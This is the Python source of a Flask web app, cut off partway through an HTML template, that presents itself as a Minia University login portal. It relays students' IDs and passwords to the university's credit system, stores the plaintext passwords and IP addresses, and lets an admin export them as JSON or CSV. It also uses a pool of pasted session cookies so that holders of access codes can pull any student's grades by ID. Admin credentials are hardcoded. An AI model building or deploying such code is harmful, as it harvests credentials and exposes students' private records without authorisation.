from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
import requests
import json
import time
import os
from functools import wraps
from datetime import datetime
import hashlib
import csv
from io import StringIO

# ========== إعدادات Vercel ==========
# استخدام تخزين مؤقت في الذاكرة للتجربة
# ملاحظة: على Vercel، الملفات مؤقتة وسيتم مسحها عند إعادة التشغيل
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'minia_university_secret_key_2026')
app.debug = False
app.permanent_session_lifetime = 3600  # ساعة واحدة

# ========== إعدادات الجامعة ==========
BASE_URL = "http://credit.minia.edu.eg"
LOGIN_URL = f"{BASE_URL}/studentLogin"
DATA_URL = f"{BASE_URL}/getJCI"

# ========== استخدام التخزين المؤقت في الذاكرة ==========
# ملاحظة: هذا التخزين مؤقت وسيختفي عند إعادة تشغيل التطبيق على Vercel
# يفضل استخدام قاعدة بيانات خارجية مثل MongoDB Atlas أو Supabase للتخزين الدائم
MEMORY_STORAGE = {
    "student_codes": {},
    "banned_users": set(),
    "banned_student_codes": [],
    "access_codes": {},
    "settings": {
        "single_code_per_user": True,
        "subscription_required": True,
        "maintenance_mode": False,
        "cookie_rotation": True,
        "max_cookie_uses": 50
    },
    "whitelist": [],
    "cookies": {}
}

# ========== بيانات الأدمن والمطور ==========
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "admin123"
DEV_TELEGRAM = " 𓆩⋆ ׅᎯ𝔹Ꮇ ׅ⋆𓆪"
DEV_TELEGRAM_LINK = "https://t.me/BO_R0"

# ========== دوال مساعدة للتخزين المؤقت ==========
def load_student_codes():
    """تحميل قاعدة بيانات أكواد الطلاب"""
    return MEMORY_STORAGE.get("student_codes", {})

def save_student_codes(codes):
    """حفظ قاعدة بيانات أكواد الطلاب"""
    MEMORY_STORAGE["student_codes"] = codes

def get_user_data(user_id):
    """جلب بيانات المستخدم (الكود، الباسورد، IP)"""
    codes = load_student_codes()
    user_id_str = str(user_id)
    
    if user_id_str in codes and isinstance(codes[user_id_str], dict):
        return codes[user_id_str]
    else:
        return {}

def set_user_data(user_id, student_code, password=None, ip_address=None):
    """تسجيل بيانات المستخدم مع كلمة المرور والـ IP"""
    codes = load_student_codes()
    user_id_str = str(user_id)
    
    if user_id_str not in codes or not isinstance(codes[user_id_str], dict):
        codes[user_id_str] = {}
    
    codes[user_id_str]["student_code"] = student_code
    if password:
        codes[user_id_str]["password"] = password
    if ip_address:
        if "ips" not in codes[user_id_str] or not isinstance(codes[user_id_str]["ips"], list):
            codes[user_id_str]["ips"] = []
        if ip_address not in codes[user_id_str]["ips"]:
            codes[user_id_str]["ips"].append(ip_address)
        codes[user_id_str]["last_ip"] = ip_address
        codes[user_id_str]["last_seen"] = datetime.now().isoformat()
    
    codes[user_id_str]["updated_at"] = datetime.now().isoformat()
    save_student_codes(codes)

def get_user_student_code(user_id):
    """جلب كود الطالب المسجل للمستخدم"""
    user_data = get_user_data(user_id)
    if isinstance(user_data, dict):
        return user_data.get("student_code")
    return None

def set_user_student_code(user_id, student_code):
    """تسجيل كود الطالب للمستخدم"""
    set_user_data(user_id, student_code)

def get_user_ip(request):
    """الحصول على عنوان IP الحقيقي للمستخدم"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr or '0.0.0.0'

def load_access_codes():
    """تحميل أكواد الوصول"""
    return MEMORY_STORAGE.get("access_codes", {})

def save_access_codes(codes):
    """حفظ أكواد الوصول"""
    MEMORY_STORAGE["access_codes"] = codes

def load_settings():
    """تحميل الإعدادات"""
    return MEMORY_STORAGE.get("settings", {
        "single_code_per_user": True,
        "subscription_required": True,
        "maintenance_mode": False,
        "cookie_rotation": True,
        "max_cookie_uses": 50
    })

def save_settings(settings):
    """حفظ الإعدادات"""
    MEMORY_STORAGE["settings"] = settings

def load_whitelist():
    """تحميل قائمة البيض"""
    return MEMORY_STORAGE.get("whitelist", [])

def save_whitelist(whitelist):
    """حفظ قائمة البيض"""
    MEMORY_STORAGE["whitelist"] = whitelist

def load_banned_users():
    """تحميل قائمة المحظورين"""
    return MEMORY_STORAGE.get("banned_users", set())

def save_banned_user(user_id):
    """حفظ مستخدم محظور"""
    banned = load_banned_users()
    banned.add(str(user_id))
    MEMORY_STORAGE["banned_users"] = banned

def load_banned_student_codes():
    """تحميل قائمة أكواد الطلاب المحظورة"""
    return MEMORY_STORAGE.get("banned_student_codes", [])

def save_banned_student_codes(codes):
    """حفظ قائمة أكواد الطلاب المحظورة"""
    MEMORY_STORAGE["banned_student_codes"] = codes

def add_banned_student_code(code):
    """إضافة كود طالب إلى قائمة المحظورين"""
    codes = load_banned_student_codes()
    if code not in codes:
        codes.append(code)
        save_banned_student_codes(codes)
        return True
    return False

def remove_banned_student_code(code):
    """إزالة كود طالب من قائمة المحظورين"""
    codes = load_banned_student_codes()
    if code in codes:
        codes.remove(code)
        save_banned_student_codes(codes)
        return True
    return False

def is_banned_student_code(student_code):
    """التحقق من كون كود الطالب محظوراً"""
    banned_codes = load_banned_student_codes()
    return student_code in banned_codes

def is_banned(user_id):
    """التحقق مما إذا كان المستخدم محظوراً"""
    return str(user_id) in load_banned_users()

def is_whitelisted(user_id):
    """التحقق مما إذا كان المستخدم في قائمة البيض"""
    return str(user_id) in load_whitelist()

def check_and_ban_user(user_id, student_code, password=None, ip_address=None):
    """التحقق من كود الطالب والباسورد وحظر المستخدم إذا كان مختلف"""
    
    if is_whitelisted(str(user_id)):
        return False, "whitelist_bypass"
    
    user_data = get_user_data(user_id)
    
    if not isinstance(user_data, dict):
        user_data = {}
    
    saved_code = user_data.get("student_code")
    saved_password = user_data.get("password")
    
    settings = load_settings()
    
    if not saved_code:
        set_user_data(user_id, student_code, password, ip_address)
        return False, "new_user"
    
    single_code_enabled = settings.get("single_code_per_user", True)
    
    set_user_data(user_id, saved_code, None, ip_address)
    
    if saved_code != student_code and single_code_enabled:
        save_banned_user(user_id)
        return True, "banned_different_code"
    
    elif saved_code != student_code and not single_code_enabled:
        new_password = password if password else saved_password
        set_user_data(user_id, student_code, new_password, ip_address)
        return False, "code_updated"
    
    if password and saved_password != password:
        set_user_data(user_id, student_code, password, ip_address)
        return False, "password_updated"
    
    return False, "code_match"

def mark_code_as_used(code, user_id, ip_address=None):
    """تحديد كود الوصول كمستخدم"""
    codes = load_access_codes()
    if code in codes and isinstance(codes[code], dict):
        codes[code]["used"] = True
        codes[code]["used_by"] = user_id
        codes[code]["used_ip"] = ip_address
        codes[code]["used_at"] = datetime.now().isoformat()
        save_access_codes(codes)
        return True
    return False

# ========== نظام الكوكيز المحسن ==========
def load_cookies():
    """تحميل الكوكيز مع معلومات إضافية"""
    return MEMORY_STORAGE.get("cookies", {})

def save_cookies(cookies_data):
    """حفظ الكوكيز"""
    MEMORY_STORAGE["cookies"] = cookies_data

def add_cookie(cookie_value, description=""):
    """إضافة كوكيز جديدة"""
    cookies = load_cookies()
    cookie_id = hashlib.md5(f"{cookie_value}{time.time()}".encode()).hexdigest()[:8]
    
    user_id_value = extract_user_id_from_cookie(cookie_value)
    
    cookies[cookie_id] = {
        "value": cookie_value,
        "user_id": user_id_value,
        "description": description,
        "added_at": datetime.now().isoformat(),
        "is_active": True,
        "usage_count": 0,
        "last_used": None,
        "error_count": 0,
        "is_valid": True
    }
    save_cookies(cookies)
    return cookie_id

def extract_user_id_from_cookie(cookie_string):
    """استخراج قيمة userID من سلسلة الكوكيز"""
    try:
        if not isinstance(cookie_string, str):
            return "unknown"
        
        parts = cookie_string.split(';')
        for part in parts:
            if 'userID=' in part:
                return part.split('userID=')[1].strip()
    except:
        pass
    return "unknown"

def get_active_cookies():
    """جلب الكوكيز النشطة والصالحة"""
    cookies = load_cookies()
    settings = load_settings()
    max_uses = settings.get("max_cookie_uses", 50)
    
    active = []
    for cid, data in cookies.items():
        if isinstance(data, dict) and data.get("is_active", True) and data.get("is_valid", True):
            if data.get("usage_count", 0) < max_uses:
                active.append({
                    "id": cid, 
                    "value": data["value"], 
                    "description": data.get("description", ""),
                    "usage_count": data.get("usage_count", 0)
                })
    return active

def get_best_cookie():
    """اختيار أفضل كوكيز متاحة (الأقل استخداماً)"""
    active = get_active_cookies()
    if not active:
        return None
    
    best_cookie = min(active, key=lambda x: x['usage_count'])
    return best_cookie['value']

def increment_cookie_usage(cookie_value, success=True):
    """زيادة عداد استخدام الكوكيز وتسجيل النتيجة"""
    cookies = load_cookies()
    for cid, data in cookies.items():
        if isinstance(data, dict) and data.get("value") == cookie_value:
            data["usage_count"] = data.get("usage_count", 0) + 1
            data["last_used"] = datetime.now().isoformat()
            
            if not success:
                data["error_count"] = data.get("error_count", 0) + 1
                if data.get("error_count", 0) >= 3:
                    data["is_valid"] = False
            else:
                data["error_count"] = 0
            
            save_cookies(cookies)
            break

def validate_cookie(cookie_value):
    """التحقق من صحة الكوكيز عن طريق طلب تجريبي"""
    try:
        session_req = requests.Session()
        
        if isinstance(cookie_value, str):
            if ';' in cookie_value:
                for part in cookie_value.split(';'):
                    if '=' in part:
                        key, value = part.strip().split('=', 1)
                        session_req.cookies.set(key.strip(), value.strip())
            else:
                session_req.cookies.set('userID', cookie_value)
        
        param2 = {
            'ScopeID': '179.11.',
            'ScopeProgID': '12.',
            'StudentCurrentID': 'test',
            'silang': 'A'
        }
        
        response = session_req.get(DATA_URL, params={
            'param0': 'Reports.StudentData',
            'param1': 'getStudentCourse',
            'param2': json.dumps(param2)
        }, timeout=10)
        
        return response.status_code == 200
    except:
        return False

# ========== دوال الاتصال بالجامعة ==========
def login_to_university(student_id, password):
    """تسجيل الدخول إلى نظام الجامعة"""
    session_req = requests.Session()
    
    login_data = {
        'UserName': student_id,
        'Password': password,
        'sysID': '313',
        'UserLang': 'A',
        'userType': '2'
    }
    
    try:
        response = session_req.post(LOGIN_URL, data=login_data, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }, timeout=30)
        
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success') or 'true' in response.text.lower():
                    return session_req, "SUCCESS"
                else:
                    return None, "LOGIN_FAILED"
            except:
                if 'true' in response.text.lower() or 'success' in response.text.lower():
                    return session_req, "SUCCESS"
                else:
                    return None, "LOGIN_FAILED"
        else:
            return None, f"HTTP_ERROR: {response.status_code}"
            
    except requests.Timeout:
        return None, "TIMEOUT"
    except requests.RequestException as e:
        return None, f"NETWORK_ERROR: {str(e)}"
    except Exception as e:
        return None, f"UNKNOWN_ERROR: {str(e)}"

def get_student_grades(session_req, student_id):
    """جلب درجات الطالب"""
    try:
        param2 = {
            'ScopeID': '179.11.',
            'ScopeProgID': '12.',
            'StudentCurrentID': student_id,
            'silang': 'A',
            'ScopeLevelID': None,
            'ReportID': ''
        }
        
        response = session_req.get(DATA_URL, params={
            'param0': 'Reports.StudentData',
            'param1': 'getStudentCourse',
            'param2': json.dumps(param2)
        }, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'application/json, text/javascript, */*; q=0.01'
        }, timeout=30)
        
        if response.status_code == 200:
            try:
                data = response.json()
                return data, None
            except:
                return None, "خطأ في تحليل البيانات"
        else:
            return None, f"HTTP Error: {response.status_code}"
            
    except Exception as e:
        return None, str(e)

def get_free_result_with_static_cookie(student_id, cookie_value):
    """جلب النتيجة باستخدام كوكيز ثابتة (محسنة)"""
    try:
        session_req = requests.Session()
        
        if isinstance(cookie_value, str):
            if ';' in cookie_value:
                for part in cookie_value.split(';'):
                    if '=' in part:
                        key, value = part.strip().split('=', 1)
                        session_req.cookies.set(key.strip(), value.strip())
            else:
                session_req.cookies.set('userID', cookie_value)
        
        param2 = {
            'ScopeID': '179.11.',
            'ScopeProgID': '12.',
            'StudentCurrentID': student_id,
            'silang': 'A'
        }
        
        response = session_req.get(DATA_URL, params={
            'param0': 'Reports.StudentData',
            'param1': 'getStudentCourse',
            'param2': json.dumps(param2)
        }, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Requested-With': 'XMLHttpRequest'
        }, timeout=30)
        
        if response.status_code == 200:
            try:
                data = response.json()
                increment_cookie_usage(cookie_value, success=True)
                return {'success': True, 'data': data}
            except:
                increment_cookie_usage(cookie_value, success=False)
                return {'success': False, 'message': 'خطأ في تحليل البيانات'}
        else:
            increment_cookie_usage(cookie_value, success=False)
            return {'success': False, 'message': f'فشل الاتصال: {response.status_code}'}
            
    except Exception as e:
        increment_cookie_usage(cookie_value, success=False)
        return {'success': False, 'message': str(e)}

# ========== الصفحات الرئيسية ==========
@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE, dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)

@app.route('/login', methods=['POST'])
def login():
    """معالج تسجيل الدخول الموحد - يتعرف تلقائياً على نوع الدخول"""
    identifier = request.form.get('identifier')
    credential = request.form.get('credential')
    user_ip = get_user_ip(request)
    
    if not identifier or not credential:
        return render_template_string(LOGIN_PAGE, error="الرجاء إدخال جميع البيانات", dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)
    
    settings = load_settings()
    if settings.get("maintenance_mode", False) and identifier != ADMIN_USERNAME:
        return render_template_string(LOGIN_PAGE, error="🚧 النظام في وضع الصيانة، يرجى المحاولة لاحقاً", dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)
    
    if identifier == ADMIN_USERNAME and credential == ADMIN_PASSWORD:
        session['user_id'] = "admin"
        session['is_admin'] = True
        session.permanent = True
        set_user_data("admin", "admin", ADMIN_PASSWORD, user_ip)
        return redirect(url_for('admin_panel'))
    
    if is_banned_student_code(identifier):
        return render_template_string(LOGIN_PAGE, error="🚫 هذا الكود محظور ولا يمكن استخدامه", dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)
    
    access_codes = load_access_codes()
    if credential in access_codes:
        student_id = identifier
        access_code = credential
        
        code_data = access_codes[access_code]
        
        if not isinstance(code_data, dict):
            code_data = {}
        
        if code_data.get("single_use", False) and code_data.get("used", False):
            return render_template_string(LOGIN_PAGE, error="❌ هذا الكود مستخدم بالفعل", dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)
        
        current_cookie = get_best_cookie()
        if not current_cookie:
            return render_template_string(LOGIN_PAGE, error="⚠️ لا توجد كوكيز متاحة - الرجاء إضافة كوكيز أولاً", dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)
        
        if code_data.get("single_use", False):
            mark_code_as_used(access_code, student_id, user_ip)
        
        result = get_free_result_with_static_cookie(student_id, current_cookie)
        
        if not result.get('success'):
            return render_template_string(LOGIN_PAGE, error=result.get('message', 'فشل في جلب النتيجة'), dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)
        
        set_user_data(f"access_{student_id}_{int(time.time())}", student_id, None, user_ip)
        
        return render_template_string(RESULT_PAGE, data=result['data'], now=datetime.now(), dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)
    
    student_id = identifier
    password = credential
    
    if is_banned(student_id):
        return render_template_string(LOGIN_PAGE, error="🚫 تم حظر هذا الحساب", dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)
    
    session_req, status = login_to_university(student_id, password)
    
    if status != "SUCCESS":
        return render_template_string(LOGIN_PAGE, error="❌ بيانات دخول غير صحيحة", dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)
    
    ban_result, ban_reason = check_and_ban_user(student_id, student_id, password, user_ip)
    if ban_result:
        return render_template_string(LOGIN_PAGE, error="🚫 تم حظر هذا الحساب", dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)
    
    session['user_id'] = student_id
    session['student_id'] = student_id
    session.permanent = True
    
    grades, error = get_student_grades(session_req, student_id)
    
    if error:
        return render_template_string(RESULT_PAGE, error=error, dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)
    
    return render_template_string(RESULT_PAGE, data=grades, now=datetime.now(), dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

# ========== لوحة التحكم (Admin Panel) ==========
@app.route('/admin')
def admin_panel():
    if 'is_admin' not in session:
        return redirect(url_for('index'))
    
    return render_template_string(ADMIN_PAGE, dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)

@app.route('/admin/settings', methods=['GET', 'POST'])
def admin_settings():
    if 'is_admin' not in session:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        settings = {
            "single_code_per_user": request.form.get('single_code') == 'on',
            "subscription_required": request.form.get('subscription') == 'on',
            "maintenance_mode": request.form.get('maintenance') == 'on',
            "cookie_rotation": request.form.get('cookie_rotation') == 'on',
            "max_cookie_uses": int(request.form.get('max_cookie_uses', 50))
        }
        save_settings(settings)
        return redirect(url_for('admin_panel'))
    
    settings = load_settings()
    return render_template_string(SETTINGS_PAGE, settings=settings, dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)

@app.route('/admin/users')
def admin_users():
    if 'is_admin' not in session:
        return redirect(url_for('index'))
    
    student_codes = load_student_codes()
    banned_users = load_banned_users()
    whitelist = load_whitelist()
    
    return render_template_string(USERS_PAGE,
                                 student_codes=student_codes,
                                 banned_users=banned_users,
                                 whitelist=whitelist,
                                 dev_link=DEV_TELEGRAM_LINK,
                                 dev_name=DEV_TELEGRAM)

@app.route('/admin/banned_codes', methods=['GET', 'POST'])
def admin_banned_codes():
    if 'is_admin' not in session:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        action = request.form.get('action')
        code = request.form.get('code')
        
        if action == 'add':
            add_banned_student_code(code)
        elif action == 'remove':
            remove_banned_student_code(code)
        
        return redirect(url_for('admin_banned_codes'))
    
    banned_codes = load_banned_student_codes()
    return render_template_string(BANNED_CODES_PAGE, banned_codes=banned_codes, dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)

@app.route('/admin/cookies', methods=['GET', 'POST'])
def admin_cookies():
    if 'is_admin' not in session:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'add':
            cookie_value = request.form.get('cookie_value')
            description = request.form.get('description', '')
            add_cookie(cookie_value, description)
        elif action == 'delete':
            cookie_id = request.form.get('cookie_id')
            cookies = load_cookies()
            if cookie_id in cookies:
                del cookies[cookie_id]
                save_cookies(cookies)
        elif action == 'toggle':
            cookie_id = request.form.get('cookie_id')
            cookies = load_cookies()
            if cookie_id in cookies and isinstance(cookies[cookie_id], dict):
                cookies[cookie_id]['is_active'] = not cookies[cookie_id].get('is_active', True)
                save_cookies(cookies)
        elif action == 'validate':
            cookie_id = request.form.get('cookie_id')
            cookies = load_cookies()
            if cookie_id in cookies and isinstance(cookies[cookie_id], dict):
                is_valid = validate_cookie(cookies[cookie_id]['value'])
                cookies[cookie_id]['is_valid'] = is_valid
                cookies[cookie_id]['last_validated'] = datetime.now().isoformat()
                save_cookies(cookies)
        elif action == 'reset_errors':
            cookie_id = request.form.get('cookie_id')
            cookies = load_cookies()
            if cookie_id in cookies and isinstance(cookies[cookie_id], dict):
                cookies[cookie_id]['error_count'] = 0
                cookies[cookie_id]['is_valid'] = True
                save_cookies(cookies)
        
        return redirect(url_for('admin_cookies'))
    
    cookies = load_cookies()
    return render_template_string(COOKIES_PAGE, cookies=cookies, dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)

@app.route('/admin/access_codes', methods=['GET', 'POST'])
def admin_access_codes():
    if 'is_admin' not in session:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        code = request.form.get('code')
        code_type = request.form.get('type')
        
        codes = load_access_codes()
        codes[code] = {
            "single_use": code_type == "single_use",
            "used": False,
            "created_at": datetime.now().isoformat(),
            "created_by": session.get('user_id', 'admin')
        }
        save_access_codes(codes)
        return redirect(url_for('admin_access_codes'))
    
    codes = load_access_codes()
    return render_template_string(ACCESS_CODES_PAGE, codes=codes, dev_link=DEV_TELEGRAM_LINK, dev_name=DEV_TELEGRAM)

@app.route('/admin/whitelist', methods=['POST'])
def admin_whitelist():
    if 'is_admin' not in session:
        return redirect(url_for('index'))
    
    action = request.form.get('action')
    user_id = request.form.get('user_id')
    
    whitelist = load_whitelist()
    
    if action == 'add' and user_id not in whitelist:
        whitelist.append(user_id)
    elif action == 'remove' and user_id in whitelist:
        whitelist.remove(user_id)
    
    save_whitelist(whitelist)
    return redirect(url_for('admin_users'))

@app.route('/admin/unban', methods=['POST'])
def admin_unban():
    if 'is_admin' not in session:
        return redirect(url_for('index'))
    
    user_id = request.form.get('user_id')
    
    banned_users = load_banned_users()
    if user_id in banned_users:
        banned_users.remove(user_id)
        MEMORY_STORAGE["banned_users"] = banned_users
    
    return redirect(url_for('admin_users'))

@app.route('/admin/export_users')
def admin_export_users():
    """تصدير بيانات المستخدمين (الكود، الباسورد، IP)"""
    if 'is_admin' not in session:
        return redirect(url_for('index'))
    
    student_codes = load_student_codes()
    
    export_data = []
    for user_id, data in student_codes.items():
        if user_id != 'admin':
            if isinstance(data, dict):
                export_data.append({
                    'user_id': user_id,
                    'student_code': data.get('student_code', ''),
                    'password': data.get('password', ''),
                    'last_ip': data.get('last_ip', ''),
                    'ips': data.get('ips', []),
                    'last_seen': data.get('last_seen', ''),
                    'updated_at': data.get('updated_at', '')
                })
    
    response = app.response_class(
        response=json.dumps(export_data, indent=4, ensure_ascii=False),
        status=200,
        mimetype='application/json'
    )
    response.headers["Content-Disposition"] = "attachment; filename=users_export.json"
    return response

@app.route('/admin/export_users_csv')
def admin_export_users_csv():
    """تصدير بيانات المستخدمين بصيغة CSV"""
    if 'is_admin' not in session:
        return redirect(url_for('index'))
    
    student_codes = load_student_codes()
    
    si = StringIO()
    cw = csv.writer(si)
    
    cw.writerow(['معرف المستخدم', 'كود الطالب', 'كلمة المرور', 'آخر IP', 'جميع الـ IPs', 'آخر ظهور', 'آخر تحديث'])
    
    for user_id, data in student_codes.items():
        if user_id != 'admin':
            if isinstance(data, dict):
                cw.writerow([
                    user_id,
                    data.get('student_code', ''),
                    data.get('password', ''),
                    data.get('last_ip', ''),
                    ' | '.join(data.get('ips', []) if isinstance(data.get('ips'), list) else []),
                    data.get('last_seen', ''),
                    data.get('updated_at', '')
                ])
    
    output = si.getvalue()
    si.close()
    
    response = app.response_class(
        response=output,
        status=200,
        mimetype='text/csv'
    )
    response.headers["Content-Disposition"] = "attachment; filename=users_export.csv"
    response.headers["Content-type"] = "text/csv; charset=utf-8"
    return response

@app.route('/admin/user_details/<user_id>')
def admin_user_details(user_id):
    """عرض تفاصيل مستخدم معين"""
    if 'is_admin' not in session:
        return redirect(url_for('index'))
    
    user_data = get_user_data(user_id)
    
    return render_template_string(USER_DETAILS_PAGE, 
                                 user_id=user_id, 
                                 user_data=user_data,
                                 dev_link=DEV_TELEGRAM_LINK, 
                                 dev_name=DEV_TELEGRAM)

# ========== صفحات HTML (نفس المحتوى الأصلي) ==========
LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Minia University | Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Cinzel:wght@500;700&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

html,body{
    width:100%;
    height:100%;
    overflow-x:hidden;
}

body{
    display:flex;
    align-items:center;
    justify-content:center;
    background:
        linear-gradient(rgba(7,22,48,.78), rgba(7,22,48,.78)),
        url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTD-YOcG5h8n4ORykqy3vEllQBl9EVVVm_Y5a4nNoh00BD3l9J1Utdwp_Q&s=10');
    background-size:cover;
    background-position:center;
    font-family:'Poppins',sans-serif;
    padding:16px;
}

/* Card */
.login-box{
    width:100%;
    max-width:420px;
    background:rgba(255,255,255,.09);
    backdrop-filter:blur(16px);
    border-radius:20px;
    padding:clamp(28px,5vw,45px);
    box-shadow:0 30px 90px rgba(0,0,0,.55);
    border:1px solid rgba(212,175,55,.25);
}

/* Logo */
.logo{
    text-align:center;
    margin-bottom:26px;
}

.logo img{
    width:clamp(70px,20vw,95px);
    margin-bottom:12px;
}

.logo h1{
    font-family:'Cinzel',serif;
    font-size:clamp(20px,5vw,26px);
    color:#d4af37;
    letter-spacing:1px;
}

.logo p{
    font-size:clamp(12px,3.5vw,14px);
    color:#cfd9ff;
}

/* Inputs */
.input-group{
    margin-bottom:18px;
}

.input-group label{
    color:#e6ecff;
    font-size:clamp(13px,3.5vw,14px);
    margin-bottom:6px;
    display:block;
}

.input-group input{
    width:100%;
    padding:14px;
    border-radius:12px;
    border:1px solid rgba(255,255,255,.25);
    background:rgba(255,255,255,.12);
    color:#fff;
    font-size:16px;
}

.input-group input::placeholder{
    color:rgba(255,255,255,.65);
}

.input-group input:focus{
    outline:none;
    border-color:#d4af37;
    box-shadow:0 0 0 2px rgba(212,175,55,.3);
}

/* Button */
.login-btn{
    width:100%;
    padding:15px;
    border-radius:14px;
    border:none;
    background:linear-gradient(135deg,#d4af37,#1e3a8a);
    color:#fff;
    font-size:clamp(15px,4vw,17px);
    font-weight:600;
    cursor:pointer;
    transition:.3s ease;
}

.login-btn:hover{
    transform:translateY(-2px);
    box-shadow:0 12px 35px rgba(212,175,55,.4);
}

/* Error */
.error{
    background:rgba(220,38,38,.25);
    color:#ffdcdc;
    padding:12px;
    border-radius:10px;
    text-align:center;
    margin-bottom:18px;
    font-size:14px;
}

/* Footer */
.footer{
    text-align:center;
    margin-top:22px;
    font-size:13px;
}

.footer a{
    color:#d4af37;
    text-decoration:none;
}

.footer a:hover{
    text-decoration:underline;
}

/* Extra small phones */
@media(max-width:360px){
    .login-box{
        padding:22px;
    }
}

/* Large screens */
@media(min-width:1200px){
    .login-box{
        max-width:460px;
    }
}
</style>
</head>

<body>

<div class="login-box">

    <div class="logo">
        <img src="https://www.minia.edu.eg/minia/images/newlogo2026.png">
        <h1>Minia University</h1>
        <p>Academic Systems Portal</p>
    </div>

    {% if error %}
    <div class="error">{{ error }}</div>
    {% endif %}

    <form method="POST" action="/login">
        <div class="input-group">
            <label>Username</label>
            <input type="text" name="identifier" placeholder="Enter your username" required>
        </div>

        <div class="input-group">
            <label>Password</label>
            <input type="password" name="credential" placeholder="Enter your password" required>
        </div>

        <button class="login-btn" type="submit">Sign In</button>
    </form>

    <div class="footer">
        <a href="{{ dev_link }}" target="_blank">{{ dev_name }}</a>
    </div>

</div>

</body>
</html>
'''

RESULT_PAGE = '''
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
<meta charset="UTF-8">
<title>النتيجة | جامعة المنيا</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Cinzel:wght@500;700&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

html,body{
    width:100%;
    height:100%;
    overflow-x:hidden;
}

body{
    display:flex;
    align-items:center;
    justify-content:center;
    background:
        linear-gradient(rgba(7,22,48,.82), rgba(7,22,48,.82)),
        url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTD-YOcG5h8n4ORykqy3vEllQBl9EVVVm_Y5a4nNoh00BD3l9J1Utdwp_Q&s=10');
    background-size:cover;
    background-position:center;
    font-family:'Poppins',sans-serif;
    padding:16px;
}

/* Card */
.result-box{
    width:100%;
    max-width:850px;
    background:rgba(255,255,255,.09);
    backdrop-filter:blur(16px);
    border-radius:22px;
    padding:clamp(22px,4vw,40px);
    box-shadow:0 35px 90px rgba(0,0,0,.6);
    border:1px solid rgba(212,175,55,.25);
}

/* Header */
.header{
    text-align:center;
    margin-bottom:28px;
}

.header img{
    width:clamp(65px,18vw,90px);
    margin-bottom:10px;
}

.header h2{
    font-family:'Cinzel',serif;
    font-size:clamp(20px,5vw,26px);
    color:#d4af37;
    letter-spacing:1px;
}

.header p{
    font-size:clamp(12px,3.5vw,14px);
    color:#cfd9ff;
}

/* Info table */
.info{
    background:rgba(255,255,255,.08);
    border-radius:18px;
    padding:clamp(18px,3vw,26px);
    border:1px solid rgba(255,255,255,.15);
}

.info-row{
    display:flex;
    flex-wrap:wrap;
    margin-bottom:14px;
    padding-bottom:10px;
    border-bottom:1px solid rgba(255,255,255,.15);
}

.info-label{
    min-width:140px;
    color:#d4af37;
    font-weight:600;
}

.info-value{
    color:#fff;
    flex:1;
}

/* Stats */
.stats{
    display:flex;
    flex-wrap:wrap;
    justify-content:center;
    gap:16px;
    margin:26px 0;
}

.stat{
    background:linear-gradient(135deg,#d4af37,#1e3a8a);
    color:#fff;
    padding:22px 28px;
    border-radius:16px;
    text-align:center;
    box-shadow:0 12px 35px rgba(212,175,55,.35);
    font-size:18px;
    display:flex;
    align-items:center;
    gap:20px;
    justify-content:center;
}

.stat .icon{
    font-size:22px;
}

/* Button */
.actions{
    text-align:center;
    margin-top:22px;
}

.btn{
    display:inline-block;
    padding:14px 34px;
    border-radius:14px;
    background:linear-gradient(135deg,#d4af37,#1e3a8a);
    color:#fff;
    text-decoration:none;
    font-weight:600;
    transition:.3s;
}

.btn:hover{
    transform:translateY(-2px);
